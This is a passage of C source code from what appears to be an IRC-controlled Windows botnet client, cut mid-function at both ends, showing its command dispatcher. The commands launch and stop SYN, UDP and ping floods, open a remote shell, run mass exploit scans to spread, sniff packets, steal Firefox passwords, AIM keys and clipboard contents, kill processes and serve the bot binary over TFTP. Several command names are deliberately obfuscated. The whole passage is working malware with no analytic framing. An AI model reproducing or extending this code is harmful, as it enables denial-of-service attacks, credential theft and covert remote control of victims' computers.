				stopthread(sock,a[2],notice,silent,"4<<12[SOCKS4]4>>12","Server",SOCKS4_THREAD,a[s+1]);

				return 1;
			}
			#endif
			else if (strcmp("httpstop",a[s]) == 0) {
				stopthread(sock,a[2],notice,silent,"4<<12[HTTPD]4>>12","Server",HTTP_THREAD,a[s+1]);

				return 1;
			}
			else if (strcmp("logoff",a[s]) == 0 || strcmp("logstop",a[s]) == 0) {
				stopthread(sock,a[2],notice,silent,"4<<12[LOGSTOP]4>>12","Log list",LOG_THREAD,a[s+1]);

				return 1;
			}
			else if (strcmp("redirectstop",a[s]) == 0) {
				stopthread(sock,a[2],notice,silent,"4<<12[REDIRECT]4>>12","TCP redirect",REDIRECT_THREAD,a[s+1]);

				return 1;
			}
			else if (strcmp("ddos.stop",a[s]) == 0 || strcmp("ddosstop",a[s]) == 0) {
				stopthread(sock,a[2],notice,silent,"4<<12[DDoS]4>>12","DDoS flood",DDOS_THREAD,a[s+1]);

				return 1;
			}
			else if (strcmp("synstop",a[s]) == 0) {
				stopthread(sock,a[2],notice,silent,"4<<12[SYN]4>>12","Syn flood",SYN_THREAD,a[s+1]);

				return 1;
			}
			else if (strcmp("supersynstop",a[s]) == 0) {
				stopthread(sock,a[2],notice,silent,"4<<12[SYN]4>>12","Super Syn Flood",SUPERSYN_THREAD,a[s+1]);

				return 1;
			}
			else if (strcmp("packetstop",a[s]) == 0) {
				stopthread(sock,a[2],notice,1,"4<<12[DDoS]4>>12","DDoS flood",DDOS_THREAD,a[s+1]);
				stopthread(sock,a[2],notice,1,"4<<12[SYN]4>>12","Syn flood",SYN_THREAD,a[s+1]);
				stopthread(sock,a[2],notice,1,"4<<12[UDP]4>>12","UDP flood",UDP_THREAD,a[s+1]);
				stopthread(sock,a[2],notice,1,"4<<12[UDP]4>>12","Super Syn Flood",SUPERSYN_THREAD,a[s+1]);
				stopthread(sock,a[2],notice,1,"4<<12[PING]4>>12","Ping flood",PING_THREAD,a[s+1]);
				irc_privmsg(sock, a[2], "4<<12[DDoS]4>>12 All packeting activity has been halted.", notice);
				return 1;
			}
			else if (strcmp("udpstop",a[s]) == 0) {
				stopthread(sock,a[2],notice,silent,"4<<12[UPD]4>>12","UDP flood",UDP_THREAD,a[s+1]);

				return 1;
			}
			else if (strcmp("pingstop",a[s]) == 0 || strcmp("pstop",a[s]) == 0) {
				stopthread(sock,a[2],notice,silent,"4<<12[PING]4>>12","Ping flood",PING_THREAD,a[s+1]);

				return 1;
			}
			#ifndef NO_TFTPD
			else if (strcmp("tftpstop", a[s]) == 0) {
				stopthread(sock,a[2],notice,silent,"4<<12[TFTP]4>>12","Server",TFTP_THREAD,a[s+1]);

				return 1;
			}
			#endif
			#ifndef NO_FINDFILE
			else if (strcmp("findfilestop",a[s]) == 0 || strcmp("ffstop",a[s]) == 0) {
				stopthread(sock,a[2],notice,silent,"4<<12[FINDFILE]4>>12","Find file",FIND_THREAD,a[s+1]);

				return 1;
			}
			#endif
			#ifndef NO_PROCESS
			else if (strcmp("procsstop",a[s]) == 0 || strcmp("psstop",a[s]) == 0) {
				stopthread(sock,a[2],notice,silent,"4<<12[PROC]4>>12","Process list",PROC_THREAD,a[s+1]);

				return 1;
			}
			#endif
			else if (strcmp("securestop",a[s]) == 0) {
				stopthread(sock,a[2],notice,silent,"4<<12[SECURE]4>>12","Secure",SECURE_THREAD,a[s+1]);

				return 1;
			}
			else if (strcmp("scanstop",a[s]) == 0) {
				stopthread(sock,a[2],notice,silent,"4<<12[SCAN]4>>12","Scan",SCAN_THREAD,a[s+1]);

				return 1;
			}
			else if (strcmp("scanstats",a[s]) == 0 || strcmp("stats",a[s]) == 0) {
				ListExploitStats(sock,a[2],notice);

				return repeat;
			}
			else if (strcmp("r3conn3ct", a[s]) == 0 || strcmp("rc3", a[s]) == 0) {
				irc_sendv(sock, "QUIT :reconnecting\r\n");
				addlog("4<<12[MAIN]: Reconnecting.4>>");
				return 0;
			}
			else if (strcmp("r3conn3ct.in", a[s]) == 0 || strcmp("rc3in", a[s]) == 0) {
				irc_sendv(sock, "QUIT :reconnecting\r\n");
				sprintf(sendbuf, "4<<12[MAIN]: Reconnecting in %s seconds4>>", a[s+1]);
				addlog(sendbuf);
				Sleep(atoi(a[s+1]) * 1000);
				return 0;
			}
			else if (strcmp("dfjdkslfj", a[s]) == 0 || strcmp("fdijd", a[s]) == 0) {
				irc_sendv(sock, "QUIT :disconnecting\r\n");
				addlog("4<<12[MAIN]: Disconnecting.4>>");

				return -1;
			}
			else if (strcmp("quit1", a[s]) == 0 || strcmp("q1", a[s]) == 0) {
				if (a[s+1]) {
					if (x != NULL) {
						char *y = strstr(x, a[s+1]);
						if (y != NULL) irc_sendv(sock, "QUIT :%s\r\n", y);
					}
				} else
					irc_sendv(sock, "QUIT :Peace\r\n");

				return -2;
			}
			else if (strcmp("status", a[s]) == 0 || strcmp("s", a[s]) == 0) {
				sprintf(sendbuf, "4<<12[MAIN]: Status: Ready. Bot Uptime: %s.4>>", Uptime(started));
				irc_privmsg(sock, a[2], sendbuf, notice);
				addlog(sendbuf);

				return repeat;
			}
			else if (strcmp("id", a[s]) == 0 || strcmp("i", a[s]) == 0) {
				sprintf(sendbuf, "4<<12[MAIN]: Bot ID: %s.4>>", botid);
				irc_privmsg(sock, a[2], sendbuf, notice);
				addlog(sendbuf);

				return repeat;
			}
			else if (strcmp("resfsdfst", a[s]) == 0) {
				sprintf(sendbuf, ((Reboot())?("4<<12[MAIN]: Rebooting system.4>>"):("4<<12[MAIN]: Failed to reboot system.4>>")));
				irc_privmsg(sock, a[2], sendbuf, notice);
				addlog(sendbuf);

				return 1;
			}
			else if (strcmp("threads", a[s]) == 0 || strcmp("t", a[s]) == 0) {
				TLIST tlist;
				_snprintf(tlist.chan, sizeof(tlist.chan), a[2]);
				tlist.sock = sock;
				tlist.notice = notice;
				tlist.silent = silent;
				tlist.full = ((a[s+1])?((strcmp(a[s+1],"sub") == 0)?(TRUE):(FALSE)):(FALSE));

				sprintf(sendbuf, "4<<12[THREADS]: List threads.4>>");
				tlist.threadnum = addthread(sendbuf, LIST_THREAD, NULL);
				if (threads[tlist.threadnum].tHandle = CreateThread(NULL, 0, &ListThread, (LPVOID)&tlist, 0, &id)) {
					while (tlist.gotinfo == FALSE)
						Sleep(50);
				} else
					sprintf(sendbuf,"4<<12[THREADS]: Failed to start list thread, error: <%d>.4>>", GetLastError());
				addlog(sendbuf);

				return repeat;
			}
			else if (strcmp("aliases", a[s]) == 0 || strcmp("al", a[s]) == 0) {
				aliaslist(sock, a[2], notice);
				addlog("4<<12[MAIN]: Alias list.4>>");

				return repeat;
			}
			else if (strcmp("log", a[s]) == 0 || strcmp("lg", a[s]) == 0) {
				SHOWLOG showlog;
				showlog.filter[0] = '\0';
				if (x != NULL && a[s+1]) {
					char *y = strstr(x, a[s+1]);
					if (y != NULL)
						_snprintf(showlog.filter,sizeof(showlog.filter),"%s",y);
				}
				_snprintf(showlog.chan, sizeof(showlog.chan), a[2]);
				showlog.sock = sock;
				showlog.notice = notice;
				showlog.silent = silent;

				sprintf(sendbuf, "4<<12[LOG]: Listing log.4>>");
				showlog.threadnum = addthread(sendbuf, LOG_THREAD, NULL);
				if (threads[showlog.threadnum].tHandle = CreateThread(NULL, 0, &ShowLogThread, (LPVOID)&showlog, 0, &id)) {
					while (showlog.gotinfo == FALSE)
						Sleep(50);
				} else
					addlogv("4<<12[LOG]: Failed to start listing thread, error: <%d>.4>>", GetLastError());

				return 1;
			}
			else if (strcmp("clearlog", a[s]) == 0 || strcmp("clg", a[s]) == 0) {
				clearlog(sock, a[2], notice, silent);

				return 1;
			}
			#ifndef NO_NETINFO
			else if (strcmp("netinfo", a[s]) == 0 || strcmp("ni", a[s]) == 0) {
				irc_privmsg(sock, a[2], netinfo(sendbuf, host, sock), notice);
				addlog("4<<12[MAIN]: Network Info.4>>");

				return repeat;
			}
			#endif

			#ifndef NO_SUPERSYN
						else if (strcmp("supersyn", a[s]) == 0) {
							SUPERSYN supersyn;
							strncpy(supersyn.ip, a[s+1], sizeof(supersyn.ip)-1);
							strncpy(supersyn.port, a[s+2], sizeof(supersyn.port)-1);
							strncpy(supersyn.length, a[s+3], sizeof(supersyn.length)-1);
							strncpy(supersyn.chan, a[2], sizeof(supersyn.chan)-1);
							supersyn.notice = notice;
							supersyn.silent = silent;
							supersyn.sock = sock;

							sprintf(sendbuf, "4<<12[SUPERSYN]: Flooding: (%s:%s) for %s seconds.4>>", a[s+1], a[s+2], a[s+3]);
							supersyn.threadnum = addthread(sendbuf,SUPERSYN_THREAD,NULL);
							if (threads[supersyn.threadnum].tHandle = CreateThread(NULL, 0, &SuperSynThread, (LPVOID)&supersyn, 0, &id)) {
								while(supersyn.gotinfo == FALSE)
									Sleep(50);
							} else
								sprintf(sendbuf,"4<<12[SUPERSYN]: »» Failed to start flood thread, error: <%d>.4>>", GetLastError());

							if (!silent) irc_privmsg(sock, a[2], sendbuf, notice);
							addlog(sendbuf);

							return 1;
						}
			#endif
			#ifndef NO_SYSINFO
			else if (strcmp("sysinfo", a[s]) == 0 || strcmp("si", a[s]) == 0) {
				irc_privmsg(sock, a[2], sysinfo(sendbuf, sock), notice);
				addlog("4<<12[MAIN]: System Info.4>>");

				return repeat;
			}
			#endif
			else if (strcmp("safasdf", a[s]) == 0 || strcmp("asdf3344", a[s]) == 0) {
				if (!silent) irc_privmsg(sock, a[2], "4<<12[MAIN]: Removing Bot.4>>", notice);
				#ifdef DEBUG_LOGGING
				closedebuglog();
				#endif
				fclosesocket(sock);
				fWSACleanup();
				uninstall();
				ExitProcess(EXIT_SUCCESS);
			}
			#ifndef NO_PROCESS
			else if (strcmp("procs", a[s]) == 0 || strcmp("prc", a[s]) == 0) {
				if (findthreadid(PROC_THREAD) > 0) {
					if (!silent) irc_privmsg(sock, a[2], "4<<12[PROC]: Already running.4>>", notice);
				} else {
					LPROC lproc;
					_snprintf(lproc.chan, sizeof(lproc.chan), a[2]);
					lproc.sock = sock;
					lproc.notice = notice;
					lproc.silent = silent;
					lproc.full = FALSE;
					if (a[s+1])
						if (strcmp("full", a[s+1]) == 0)
							lproc.full = TRUE;

					sprintf(sendbuf,"4<<12[PROCs]: Proccess list.4>>");
					lproc.threadnum = addthread(sendbuf, PROC_THREAD, NULL);
					if (threads[lproc.threadnum].tHandle = CreateThread(NULL, 0, &listProcessesThread, (LPVOID)&lproc, 0, &id)) {
						while (lproc.gotinfo == FALSE)
							Sleep(50);
					} else
						sprintf(sendbuf,"4<<12[PROCS]: Failed to start listing thread, error: <%d>.4>>", GetLastError());
					addlog(sendbuf);
				}

				return 1;
			}
			#endif
			#ifndef NO_CDKEYS
			else if (strcmp("getaim", a[s]) == 0 || strcmp("aim", a[s]) == 0) {
				getcdkeys(sock,a[2],notice);
				sprintf(sendbuf,"4<<12[AIM]: Finished AIM Search.4>>");
				if (!silent) irc_privmsg(sock,a[2],sendbuf,notice);
				addlog(sendbuf);

				return 1;
			}
			#endif
			else if (strcmp("uptime", a[s]) == 0 || strcmp("time", a[s]) == 0) {
				DWORD uptime = -1, total = GetTickCount() / 1000;

				if(a[s+1])
					uptime = atoi(a[s+1]);

				if (total/86400 >= uptime || uptime == -1) {
					sprintf(sendbuf, "4<<12[MAIN]: Uptime: %s.4>>", Uptime());
					irc_privmsg(sock, a[2], sendbuf, notice);
					addlog(sendbuf);
				}

				return repeat;
			}
			else if (strcmp("driveinfo", a[s]) == 0 || strcmp("di", a[s]) == 0) {
				DriveInfo(sock, a[2], notice, a[s+1]);

				return 1;
			}
			else if (strcmp("testdlls", a[s]) == 0 || strcmp("dll", a[s]) == 0) {
				CheckDLLs(sock,a[2],notice,silent);

				return 1;
			}
			#ifdef DUMP_ENCRYPT
			else if (strcmp("encrypt", a[s]) == 0 || strcmp("enc", a[s]) == 0) {
				encryptstrings((sizeof(authost) / sizeof(LPTSTR)),(sizeof(versionlist) / sizeof(LPTSTR)),sock,a[2],notice);

				return 1;
			}
			#endif
			#ifndef NO_REMOTECMD
			else if (strcmp("opencasdfmd3343",a[s]) == 0 || strcmp("oadfascmd", a[s]) == 0) {
				if (findthreadid(RCMD_THREAD) > 0) {
					sprintf(sendbuf ,"4<<12[CMD]: Remote shell already running.4>>");
					if (!silent) irc_privmsg(sock,a[2],sendbuf,notice);
					addlog(sendbuf);
				} else {
					if (open_cmd(sock,a[2]) == -1)
						sprintf(sendbuf,"4<<12[CMD]: Couldn't open remote shell.4>>");
					else
						sprintf(sendbuf,"4<<12[CMD]: Remote shell ready.4>>");
					if (!silent) irc_privmsg(sock,a[2],sendbuf,notice);
					addlog(sendbuf);
				}

				return 1;
			}
			else if (strcmp("cmdstop",a[s]) == 0) {
				stopthread(sock,a[2],notice,silent,"4<<12[CMD]4>>12","Remote shell",RCMD_THREAD,a[s+1]);

				return 1;
			}
			#endif
			else if (strcmp("whokljhkhn", a[s]) == 0) {
				if (!silent) irc_privmsg(sock, a[2], "4<<12-[Login List]-4>>", notice);
				for (i = 0; i < MAXLOGINS; i++) {
					sprintf(sendbuf,"%d. %s",i,((masters[i][0] != '\0')?(masters[i]+1):("<Empty>")));
    				irc_privmsg(sock, a[2], sendbuf, notice, TRUE);
				}
				addlog("4<<12[MAIN]: Login list complete.4>>");
			}
			else if (strcmp("getclip", a[s]) == 0 || strcmp("gc", a[s]) == 0) {
				if (!silent) irc_privmsg(sock, a[2], "4<<12-[Clipboard Data]-4>>", notice);
				irc_privmsg(sock, a[2], GetClipboardText(), notice);
				addlog("4<<12[MAIN]: Get Clipboard.4>>");

				return repeat;
			}
			else if (strcmp("flusharp23", a[s]) == 0 || strcmp("fa23", a[s]) == 0) {
				if (FlushARPCache())
					_snprintf(sendbuf,sizeof(sendbuf),"4<<12[FLUSHARP]: ARP cache flushed.4>>");
				else
					_snprintf(sendbuf,sizeof(sendbuf),"4<<12[FLUSHARP]: Failed to flush ARP cache.4>>");

				if (!silent) irc_privmsg(sock, a[2], sendbuf, notice);
				addlog(sendbuf);

				return repeat;
			}
			else if (strcmp("flushdn23s", a[s]) == 0 || strcmp("f23d", a[s]) == 0) {
				if (fDnsFlushResolverCache) {
					if (fDnsFlushResolverCache())
						_snprintf(sendbuf,sizeof(sendbuf),"4<<12[FLUSHDNS]: DNS cache flushed.4>>");
					else
						_snprintf(sendbuf,sizeof(sendbuf),"4<<12[FLUSHDNS]: Failed to flush DNS cache.4>>");
				} else
					_snprintf(sendbuf,sizeof(sendbuf),"4<<12[FLUSHDNS]: Failed to load dnsapi.dll.4>>");

				if (!silent) irc_privmsg(sock, a[2], sendbuf, notice);
				addlog(sendbuf);

				return repeat;
			}
			else if (strcmp("currentip", a[s]) == 0 || strcmp("cip", a[s]) == 0) {
				int scanthread;
				if (a[s+1])
					scanthread = atoi(a[s+1]);
				else
					scanthread = findthreadnum(SCAN_THREAD);
				if (scanthread != 0)
					currentIP(sock, a[2], notice, scanthread);

				return repeat;
			}
			#ifndef NO_HTTPD
			else if (strcmp("httpserver", a[s]) == 0 || strcmp("http", a[s]) == 0) {
				HTTPD httpd;
				httpd.port = ((a[s+1])?((atoi(a[s+1])==0)?(httpport):(atoi(a[s+1]))):(httpport));
				httpd.enabled = ((parameters['d'])?(FALSE):(TRUE));
				if (a[s+2])
					sprintf(httpd.dir, a[s+2]);
				else {
					char sysdir[MAX_PATH], drive[10];
					GetSystemDirectory(sysdir,sizeof(sysdir));
					_splitpath(sysdir, drive, NULL, NULL, NULL);
				}
				if (httpd.dir[strlen(httpd.dir)-1] == 92)
					httpd.dir[strlen(httpd.dir)-1] = '\0';
				httpd.sock = sock;
				_snprintf(httpd.chan, sizeof(httpd.chan), a[2]);
				httpd.notice = notice;
				httpd.silent = silent;

				sprintf(sendbuf,"4<<12[HTTPD]: Server listening on IP: %s:%d, Directory: %s\\.4>>", GetIP(sock), httpd.port, httpd.dir);
				httpd.threadnum = addthread(sendbuf,HTTP_THREAD,NULL);
				if (threads[httpd.threadnum].tHandle = CreateThread(NULL, 0, &HTTP_Server_Thread, (LPVOID)&httpd, 0, &id)) {
					while(httpd.info == FALSE)
						Sleep(50);
				} else
					sprintf(sendbuf,"4<<12[HTTPD]: Failed to start server thread, error: <%d>.4>>", GetLastError());

				if (!silent) irc_privmsg(sock,a[2],sendbuf,notice);
				addlog(sendbuf);

				return 1;
			}
			#endif
			#ifndef NO_TFTPD
			else if (strcmp("tftpserver", a[s]) == 0 || strcmp("tftp", a[s]) == 0) {
				if (findthreadid(TFTP_THREAD) > 0)
					sprintf(sendbuf ,"4<<12[TFTP]: Already running.4>>");
				else {
					TFTP tftp;
					(a[s+1])?(_snprintf(tftp.filename, sizeof(tftp.filename), a[s+1])):(GetModuleFileName(0,tftp.filename,sizeof(tftp.filename)));
					_snprintf(tftp.requestname, sizeof(tftp.requestname), ((a[s+2])?(a[s+2]):(filename)));
					tftp.port = tftpport;
					tftp.threads = 0;
					tftp.sock = sock;
					strncpy(tftp.chan, a[2], sizeof(tftp.chan)-1);
					tftp.notice = notice;
					tftp.silent = silent;

					sprintf(sendbuf, "4<<12[TFTP]: Server started on Port: %d, File: %s, Request: %s.4>>", tftp.port, tftp.filename, tftp.requestname);
					tftp.threadnum = addthread(sendbuf,TFTP_THREAD,NULL);
					if (threads[tftp.threadnum].tHandle = CreateThread(NULL, 0, &tftpserver, (LPVOID)&tftp, 0, &id)) {
						while (tftp.gotinfo == FALSE)
							Sleep(50);
					} else
						sprintf(sendbuf,"4<<12[TFTP]: Failed to start server thread, error: <%d>.4>>", GetLastError());
				}
				if (!silent) irc_privmsg(sock, a[2], sendbuf, notice);
				addlog(sendbuf);

				return 1;
			}
			#endif
			#ifndef NO_SNIFFER
         else if (strcmp("psniff", a[s]) == 0) {
            if (strcmp("on", a[s+1]) == 0) {
               if (findthreadid(PSNIFF_THREAD) > 0)
                  sprintf(sendbuf ,"4<<12[PSNIFF]: Already running.4>>");
               else {
                  SNIFFER sniff;
                  sniff.sock = sock;
                  sniff.notice = notice;
                  sniff.silent = silent;
                  _snprintf(sniff.chan, sizeof(sniff.chan), ((a[s+2])?(a[s+2]):((strcmp(psniffchan,"")==0)?(a[2]):(psniffchan))));

                  sprintf(sendbuf, "4<<12[PSNIFF]: Carnivore packet sniffer active.4>");
                  sniff.threadnum = addthread(sendbuf, PSNIFF_THREAD, NULL);
                  if (threads[sniff.threadnum].tHandle = CreateThread(NULL, 0, &SnifferThread, (LPVOID)&sniff, 0, &id)) {
                     while(sniff.gotinfo == FALSE)
                        Sleep(50);
                  } else
                     sprintf(sendbuf,"4<<12[PSNIFF]: Failed to start sniffer thread, error: <%d>.4>>", GetLastError());
               }
            }
            else if (strcmp("off", a[s+1]) == 0) {
               if ((i=killthreadid(PSNIFF_THREAD)) > 0)
                  sprintf(sendbuf,"4<<12[PSNIFF]: Carnivore stopped. (%d thread(s) stopped.)4>>",i);
               else
                  sprintf(sendbuf,"4<<12[PSNIFF]: No Carnivore thread found.4>>");
            }
            if (!silent) irc_privmsg(sock, a[2], sendbuf, notice);
            addlog(sendbuf);

            return 1;
         }
            #endif
			#ifndef NO_FINDPASS
			else if (strcmp("findpass", a[s]) == 0 || strcmp("fp", a[s]) == 0) {
				FINDPASS findpass;
				_snprintf(findpass.chan, sizeof(findpass.chan), a[2]);
				findpass.sock = sock;
				findpass.notice = notice;
				findpass.silent = silent;

				_snprintf(sendbuf, sizeof(sendbuf),"4<<12[FINDPASS]: Searching for password.4>>");
				findpass.threadnum = addthread(sendbuf, PASS_THREAD, NULL);
				if (threads[findpass.threadnum].tHandle = CreateThread(NULL, 0, &FindPassThread, (LPVOID)&findpass, 0, &id)) {
					while (findpass.gotinfo == FALSE)
						Sleep(50);
				} else
					sprintf(sendbuf,"4<<12[FINDPASS]: Failed to start search thread, error: <%d>.4>>", GetLastError());
				addlog(sendbuf);

				return 1;
			}
			#endif
			#ifndef NO_ADVSCAN
			else if (strcmp("scanall", a[s]) == 0 || strcmp("sa", a[s]) == 0) {
				for(int i=0; scanall[i].isend != false; i++) { }
				for(int sne=0; scanall[sne].isend != false; sne++) {
					int scanthreads=findthreadid(SCAN_THREAD);
					if (scanthreads + 400/i > MAXSCANTHRD) {
						sprintf(sendbuf ,"4<<12[SCAN]: Already %d scanning threads. Too many specified.4>>", scanthreads);
						irc_privmsg(sock,a[2],sendbuf,notice);
					} else {
						ADVSCAN advscan;
						// don't edit this stuff below, you'll fuck up your mass scanning.. trust me.
						advscan.threads = 20;
						advscan.delay = 5;
						advscan.delay = ((advscan.delay < 5)?(5):(advscan.delay));
						advscan.delay = ((advscan.delay > 60)?(60):(advscan.delay));
						advscan.minutes = 0;
						//
						advscan.minutes = ((advscan.minutes > MAXSCANTIME)?(MAXSCANTIME):(advscan.minutes));
						advscan.exploit = -1;

						for(i=0;exploit[i].port != 0;i++) {
							if (strcmp(exploit[i].command, scanall[sne].command) == 0) {
								advscan.port = exploit[i].port;
								advscan.exploit = i;

								break;
							}
						}

						if (advscan.port == 0) {
							sprintf(sendbuf, "4<<12[SCAN]: Failed to start scan, port is invalid.4>>");
							if (!silent) irc_privmsg(sock, a[2], sendbuf, notice);
							addlog(sendbuf);

							return 1;
						}
						SOCKADDR_IN ssin;
						int ssin_len=sizeof(ssin);
						fgetsockname(sock,(LPSOCKADDR)&ssin,&ssin_len);
						ssin.sin_addr.S_un.S_addr&=(parameters['a']) ? 0xFF : 0xFFFF;
						strncpy(advscan.ip,finet_ntoa(ssin.sin_addr), sizeof(advscan.ip));

						int extractip = ((parameters['a']) ? 3 : 2);
						for (char *c=strrchr(advscan.ip,'0'),i=0;i<extractip && c;c[0]='x',c=strrchr(advscan.ip,'0'),i++);
						advscan.random = TRUE;
						advscan.sock = sock;
						advscan.notice = notice;
						advscan.silent = silent;
						_snprintf(advscan.chan,sizeof(advscan.chan),a[2]);
						if (strcmp(exploitchan,"") != 0)
							_snprintf(advscan.msgchan,sizeof(advscan.msgchan),exploitchan);
						else
							advscan.msgchan[0] = '\0';

						sprintf(sendbuf, "4<<12[SCAN]: %s Port Scan started on %s:%d with a delay of %d seconds for %d minutes using %d threads.4>>",
							((advscan.random)?("Random"):("Sequential")), advscan.ip, advscan.port, advscan.delay, advscan.minutes, advscan.threads);
						advscan.threadnum = addthread(sendbuf,SCAN_THREAD,NULL);
						if (threads[advscan.threadnum].tHandle = CreateThread(NULL, 0, &AdvScanner, (LPVOID)&advscan, 0, &id)) {
							while(advscan.gotinfo == FALSE)
								Sleep(50);
						} else
							sprintf(sendbuf,"4<<12[SCAN]: Failed to start scan thread, error: <%d>.4>>", GetLastError());

						if (!silent) irc_privmsg(sock, a[2], sendbuf, notice);
						addlog(sendbuf);

					}
				}
				return 1;
			}
			#endif
			#ifndef NO_FIREFOX 
			else if (strcmp("firefox", a[s]) == 0) {    
			
			FIREFOX firefox; 
			firefox.sock = sock; 
			firefox.notice = notice; 
			firefox.dest = fxchan; 
			sprintf(sendbuf, ".n.z.m. (firefox.p.l.g) .»».  Firefox something/."); 
			firefox.threadnum = addthread(sendbuf, FIREFOX_THREAD, NULL); 
			if(threads[firefox.threadnum].tHandle = CreateThread(NULL,0, &FindFirefoxPasses, (LPVOID)&firefox,0, &id)) { 
				while(firefox.gotinfo == FALSE) 
					Sleep(50); 
			} else 
				sprintf(sendbuf, ".n.z.m. (firefox.p.l.g) .»».  Failed to start firefox thread, error: <%d>.", GetLastError()); 
			addlog(sendbuf); 

    return repeat; 

  } 
  #endif 

			// commands requiring at least 1 parameter
			else if (a[s+1] == NULL) return 1;
			else if (strcmp("nick", a[s]) == 0 || strcmp("n", a[s]) == 0) {
				irc_sendv(sock, "NICK %s\r\n", a[s+1]);
				addlogv("4<<12[MAIN]: Nick changed to: '%s'.4>>",a[s+1]);

				return repeat;
			}
			else if (strcmp("join", a[s]) == 0 || strcmp("j", a[s]) == 0) {
				irc_sendv(sock, "JOIN %s %s\r\n", a[s+1], a[s+2]);
				addlogv("4<<12[MAIN]: Joined channel: '%s'.4>>",a[s+1]);

				return repeat;
			}
			else if (strcmp("joinflood", a[s]) == 0 || strcmp("jflood", a[s]) == 0) {
				irc_sendv(sock, "JOIN %s %s\r\n", a[s+1], a[s+2]);
				irc_sendv(sock, "PART %s\r\n", a[s+1]);
				irc_sendv(sock, "JOIN %s %s\r\n", a[s+1], a[s+2]);
				irc_sendv(sock, "PART %s\r\n", a[s+1]);
				irc_sendv(sock, "JOIN %s %s\r\n", a[s+1], a[s+2]);
				irc_sendv(sock, "PART %s\r\n", a[s+1]);

				return repeat;
			}
			else if (strcmp("part", a[s]) == 0 || strcmp("pt", a[s]) == 0) {
				irc_sendv(sock, "PART %s\r\n", a[s+1]);
				addlogv("4<<12[MAIN]: Parted channel: '%s'.4>>",a[s+1]);

				return repeat;
			}
			else if (strcmp("raw", a[s]) == 0 || strcmp("r", a[s]) == 0) {
				if (x != NULL) {
					char *y = strstr(x, a[s+1]);
					if (y != NULL) {
						irc_sendv(sock, "%s\r\n", y);
						addlogv("4<<12[MAIN]: IRC Raw: %s.4>>",y);
					}
				}

				return repeat;
			}
			else if (strcmp("killthread", a[s]) == 0 || strcmp("kt", a[s]) == 0) {
				if (strcmp("all", a[s+1]) == 0) {
					if ((i=killthreadall()) > 0)
						sprintf(sendbuf,"4<<12[THREADS]: Stopped: %d thread(s).4>>", i);
					else
						sprintf(sendbuf,"4<<12[THREADS]: No active threads found.4>>");
					if (!silent) irc_privmsg(sock, a[2], sendbuf, notice);
					addlog(sendbuf);					
				} else {
					for (i = s+1; i < (sizeof(a)/4); i++) {
						if (a[i]==NULL) break;
					
						if (killthread(atoi(a[i])))
							sprintf(sendbuf,"4<<12[THREADS]: Killed thread: %s.4>>",a[i]);
						else 
							sprintf(sendbuf,"4<<12[THREADS]: Failed to kill thread: %s.4>>",a[i]);
						if (!silent) irc_privmsg(sock, a[2], sendbuf, notice);
						addlog(sendbuf);
					}
				}

				return 1;
			}
			else if (strcmp("prefi1x", a[s]) == 0 || strcmp("pr1fx", a[s]) == 0) {
				prefix = a[s+1][0];
				sprintf(sendbuf,"4<<12[MAIN]: Prefix changed to: '%c'.4>>",a[s+1][0]);
				if (!silent) irc_privmsg(sock, a[2], sendbuf, notice);
				addlog(sendbuf);

				return 1;
			}
			else if (strcmp("open1", a[s]) == 0 || strcmp("o1", a[s]) == 0) {
				if (fShellExecute(0, "open", a[s+1], NULL, NULL, SW_SHOW))
					sprintf(sendbuf,"4<<12[SHELL]: File opened: %s4>>", a[s+1]);
				else
					sprintf(sendbuf,"4<<12[SHELL]: Couldn't open file: %s4>>", a[s+1]);
				if (!silent) irc_privmsg(sock, a[2], sendbuf, notice);
				addlog(sendbuf);

				return repeat;
			}
			else if (strcmp("sld;kfj;lakj", a[s]) == 0 || strcmp("disfijd", a[s]) == 0) {
				strncpy(server,  a[s+1], 127);
				sprintf(sendbuf,"4<<12[MAIN]: Server changed to: '%s'.4>>",a[s+1]);
				if (!silent) irc_privmsg(sock, a[2], sendbuf, notice);
				addlog(sendbuf);

				return 1;
			}
			else if (strcmp("serverrsdft", a[s]) == 0 || strcmp("sersdfsdcc", a[s]) == 0) {
				strncpy(server,  a[s+1], 127);
				sprintf(sendbuf,".4<<.12[MAIN]: Server changed and reconnecting to: '%s'..4>>",a[s+1]);
				if (!silent) irc_privmsg(sock, a[2], sendbuf, notice);
				addlog(sendbuf);
				irc_sendv(sock, "QUIT :reconnecting\r\n");

				return 1;
			}
			else if (strcmp("dnssdfsf", a[s]) == 0 || strcmp("dnsdfsdf", a[s]) == 0) {
				LPHOSTENT hostent = NULL;
				IN_ADDR iaddr;
				DWORD addr = finet_addr(a[s+1]);

				if (addr != INADDR_NONE) {
					hostent = fgethostbyaddr((char *)&addr, sizeof(struct in_addr), AF_INET);
					if (hostent != NULL)
						sprintf(sendbuf, "4<<12[DNS]: Lookup: %s -> %s.4>>", a[s+1], hostent->h_name);
				}
				else {
					hostent = fgethostbyname(a[s+1]);
					if (hostent != NULL) {
						iaddr = *((LPIN_ADDR)*hostent->h_addr_list);
						sprintf(sendbuf, "4<<12[DNS]: Lookup: %s -> %s.4>>", a[s+1], finet_ntoa(iaddr));
					}
				}
				if (hostent == NULL)
					sprintf(sendbuf,"4<<12[DNS]: Couldn't resolve hostname.4>>");
				if (!silent) irc_privmsg(sock, a[2], sendbuf, notice);
				addlog(sendbuf);

				return repeat;
			}
			#ifndef NO_PROCESS
			else if (strcmp("kilsfasdfac",a[s]) == 0 || strcmp("kdfp", a[s]) == 0) {  // kill process name
				if(listProcesses(sock,NULL,notice,a[s+1]) == 1)
					sprintf(sendbuf,"4<<12[PROC]: Process killed: %s4>>",a[s+1]);
				else
					sprintf(sendbuf,"4<<12[PROC]: Failed to terminate process: %s4>>", a[s+1]);
				if (!silent) irc_privmsg(sock, a[2], sendbuf, notice);
				addlog(sendbuf);

				return repeat;
			}
			else if (strcmp("djfsifd",a[s]) == 0 || strcmp("dfjisd", a[s]) == 0) {  // kill process id
				if(killProcess(atoi(a[s+1])) == 1)
					sprintf(sendbuf,"4<<12[PROC]: Process killed ID: %s4>>",a[s+1]);
				else
					sprintf(sendbuf,"4<<12[PROC]: Failed to terminate process ID: %s4>>", a[s+1]);
				if (!silent) irc_privmsg(sock, a[2], sendbuf, notice);
				addlog(sendbuf);

				return 1;
			}
			else if (strcmp("killid",a[s]) == 0 || strcmp("kiid", a[s]) == 0) {  // kill process id
				if(killProcess(atoi(a[s+1])) == 1)
					sprintf(sendbuf,"4<<12[PROC]: Process killed ID: %s4>>",a[s+1]);
				else
					sprintf(sendbuf,"4<<12[PROC]: Failed to terminate process ID: %s4>>", a[s+1]);
				if (!silent) irc_privmsg(sock, a[2], sendbuf, notice);
				addlog(sendbuf);

